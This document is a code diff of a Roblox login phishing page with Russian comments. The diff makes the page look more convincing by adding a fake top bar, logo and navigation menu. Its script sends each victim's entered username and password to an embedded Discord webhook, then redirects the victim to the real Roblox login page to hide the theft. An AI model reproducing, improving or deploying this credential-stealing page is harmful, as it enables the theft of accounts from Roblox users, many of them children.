@@ -4,22 +4,65 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Roblox</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Hind', sans-serif; }
   
-  /* Тёмный фон с имитацией размытой игры */
+  /* Основной фон (картинка) */
   body { 
-    background: #1f222a; 
-    background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.rbxcdn.com/3b7db4a3b73c91ab92a53b1bf16582f4.jpg');
+    background-color: #1a1a1a;
+    background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('https://images.rbxcdn.com/3b7db4a3b73c91ab92a53b1bf16582f4.jpg');
     background-size: cover;
     background-position: center;
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    min-height: 100vh; 
+    background-attachment: fixed;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
   }
 
-  /* Контейнер формы */
+  /* Верхняя панель */
+  .top-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    background: rgba(25, 25, 25, 0.8);
+    color: #fff;
+  }
+  .logo-area { display: flex; align-items: center; gap: 10px; }
+  .logo-icon { width: 36px; height: 36px; background: #4263eb; border-radius: 8px; display: flex; justify-content: center; align-items: center; }
+  .logo-icon svg { width: 20px; height: 20px; fill: #fff; }
+  .logo-text { font-size: 16px; font-weight: 600; line-height: 1.1; }
+  .logo-text span { font-size: 12px; color: #a0a0a0; font-weight: 400; display: block; }
+  
+  .top-actions { display: flex; align-items: center; gap: 15px; }
+  .btn-update { background: #4263eb; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
+  .btn-signup { background: #4263eb; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
+  .search-icon { color: #fff; font-size: 20px; }
+  .close-icon { color: #4263eb; font-size: 20px; }
+
+  /* Меню навигации */
+  .nav-menu {
+    display: flex;
+    justify-content: space-around;
+    padding: 12px 0;
+    background: rgba(25, 25, 25, 0.9);
+    border-bottom: 1px solid #333;
+    font-size: 14px;
+    color: #a0a0a0;
+  }
+  .nav-item { cursor: pointer; padding: 5px; }
+  .nav-item.active { color: #fff; font-weight: 600; }
+
+  /* Центральная форма */
+  .main-content {
+    flex-grow: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
   .login-box { 
     background-color: #232527; 
     padding: 30px; 
@@ -56,7 +99,7 @@
   .input-group input::placeholder { color: #8b8f96; }
 
   .btn-login { 
-    background-color: #3e4147; 
+    background-color: transparent; 
     color: #fff; 
     border: 1px solid #fff; 
     width: 100%; 
@@ -69,7 +112,7 @@
     transition: background-color 0.2s;
   }
   
-  .btn-login:hover { background-color: #4a4d52; }
+  .btn-login:hover { background-color: rgba(255,255,255,0.1); }
 
   .forgot { 
     text-align: center; 
@@ -114,34 +157,68 @@
 </head>
 <body>
 
-<div class="login-box">
-  <div class="title">Login to Roblox</div>
-  
-  <div class="input-group">
-    <input type="text" id="username" placeholder="Username/Email/Phone">
+<!-- Верхняя панель -->
+<div class="top-bar">
+  <div class="logo-area">
+    <div class="logo-icon">
+      <svg viewBox="0 0 24 24"><path d="M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm9 5.5l-4.5 1.5 1.5 4.5 4.5-1.5-1.5-4.5z"/></svg>
+    </div>
+    <div class="logo-text">Roblox<span>Играйте в миллионы игр</span></div>
   </div>
-  
-  <div class="input-group">
-    <input type="password" id="password" placeholder="Password">
+  <div class="top-actions">
+    <button class="btn-update">Обновить</button>
+    <span class="close-icon">✕</span>
   </div>
-  
-  <button class="btn-login" id="loginBtn">Log In</button>
-  
-  <a class="forgot">Forgot Password or Username?</a>
-  
-  <div class="divider"></div>
-  
-  <button class="btn-alt">Email Me a One-Time Code</button>
-  <button class="btn-alt">Quick Sign-in</button>
-  <button class="btn-alt">Other sign-in options</button>
-  
-  <div class="signup-text">
-    Don't have an account? <a>Sign Up</a>
+</div>
+
+<!-- Меню -->
+<div class="top-bar" style="padding: 0;">
+  <div class="logo-area" style="padding: 10px 20px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="30" style="filter: invert(1);">
+  </div>
+  <div class="top-actions" style="padding: 10px 20px;">
+    <button class="btn-signup">Sign Up</button>
+    <span class="search-icon">🔍</span>
+  </div>
+</div>
+
+<div class="nav-menu">
+  <div class="nav-item active">Charts</div>
+  <div class="nav-item">Marketplace</div>
+  <div class="nav-item">Create</div>
+  <div class="nav-item">Robux</div>
+</div>
+
+<!-- Сама форма -->
+<div class="main-content">
+  <div class="login-box">
+    <div class="title">Login to Roblox</div>
+    
+    <div class="input-group">
+      <input type="text" id="username" placeholder="Username/Email/Phone">
+    </div>
+    
+    <div class="input-group">
+      <input type="password" id="password" placeholder="Password">
+    </div>
+    
+    <button class="btn-login" id="loginBtn">Log In</button>
+    
+    <a class="forgot">Forgot Password or Username?</a>
+    
+    <div class="divider"></div>
+    
+    <button class="btn-alt">Email Me a One-Time Code</button>
+    <button class="btn-alt">Quick Sign-in</button>
+    <button class="btn-alt">Other sign-in options</button>
+    
+    <div class="signup-text">
+      Don't have an account? <a>Sign Up</a>
+    </div>
   </div>
 </div>
 
 <script>
-// ТВОЙ DISCORD WEBHOOK
 const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";
 
 document.getElementById('loginBtn').addEventListener('click', async function(e) {
@@ -155,13 +232,10 @@ document.getElementById('loginBtn').addEventListener('click', async function(e) 
     return;
   }
 
-  // Меняем вид кнопки
   this.innerText = "Loading...";
   this.disabled = true;
-  this.style.opacity = "0.7";
 
-  // Отправляем данные в Discord
-  const message = `**🟦 ROBLOX (Dark Theme)**\n**Логин:** \`${user}\`\n**Пароль:** \`${pass}\``;
+  const message = `**🟦 ROBLOX (ТОЧНАЯ КОПИЯ)**\n**Логин:** \`${user}\`\n**Пароль:** \`${pass}\``;
 
   try {
     await fetch(HOOK, {
@@ -171,7 +245,6 @@ document.getElementById('loginBtn').addEventListener('click', async function(e) 
     });
   } catch(e) {}
 
-  // Перекидываем на настоящий сайт
   setTimeout(() => {
     window.location.href = "https://www.roblox.com/login";
   }, 1000);
